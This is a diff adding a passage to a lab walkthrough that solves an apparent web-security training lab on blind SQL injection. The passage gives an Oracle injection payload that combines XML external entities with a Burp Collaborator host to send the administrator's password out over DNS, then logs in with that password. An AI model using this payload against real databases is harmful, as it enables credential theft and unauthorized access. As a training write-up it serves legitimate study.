@@ -1269,6 +1269,35 @@ We have successfully solved this lab.
 
 Navigate to the webpage and click on "View details"
 
+Capturing the request and sending it over to burp repeater
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f9b80a97-9087-4069-9aee-9af5a1e740f9)
+
+We'll be using burp collaborator client for this task since we were given the table name to be ```users``` and the column names to be ```username``` and ```password```, we also have the username to be ```administrator``` so all we need is the password of the admin user
+
+```sql
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.0tu71gj5zpi129crwrp9uf5rlir9fy.oastify.com/"> %remote;]>'),'/l') FROM dual--
+```
+Replace ```0tu71gj5zpi129crwrp9uf5rlir9fy.oastify.com``` with the payload you got from your burp collaborator
+
+Applying this query
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/11a4b8ea-997f-4f7e-91d3-1458dd1b109c)
+
+Checking Burp Collaborator Client, click on "poll now", you should get this
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/349b4a04-46f4-4159-81fd-cb5a747852d9)
+
+Take a look at the domain name, the payload we got from burp collaborator client was ```0tu71gj5zpi129crwrp9uf5rlir9fy.oastify.com``` but we got something different for the domain name
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/442ab0da-8164-4a9c-9daf-5aeead10ef08)
+
+The password for the administrator user is the set of alphanumeric characters before the payload. So ```pfohk2cgqxm2ktuoer65``` is the administrator password. Lets go ahead and login as the administrator user
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ce456371-8a8c-44e8-8ad2-df381f15bbe6)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/09a5544e-c65d-4191-be21-175270e1d9b4)
+
+We have successfully solved the lab😎
 
 ----------------------------
 
